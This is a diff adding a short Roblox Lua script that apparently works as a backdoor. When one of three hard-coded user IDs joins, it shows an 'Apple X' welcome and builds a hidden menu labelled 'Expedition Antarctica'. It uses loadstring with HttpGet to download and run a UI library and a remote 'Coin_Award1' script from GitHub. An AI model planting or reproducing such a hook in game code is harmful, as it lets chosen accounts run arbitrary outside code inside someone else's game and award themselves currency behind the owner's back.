@@ -1,0 +1,20 @@
+game.Players.PlayerAdded:Connect(function(Player)
+	if Player.UserId == 1417874860 or Player.UserId == 3861125271 or Player.UserId == 3985448933 then
+		game:GetService("StarterGui"):SetCore("SendNotification",{
+			Title = "Apple X",
+			Text = "Welcome",
+		})
+
+		wait(7)
+
+		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+		local Window = Library.CreateLib("Expedition Antarctica", "DarkTheme")
+		local Main = Window:NewTab("Main")
+		local MainSection = Main:NewSection("Apple X")
+
+		MainSection:NewButton("NAME", " ", function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamachiru/AppleX/main/Coin_Award1'))()
+
+		end)
+	end
+end)
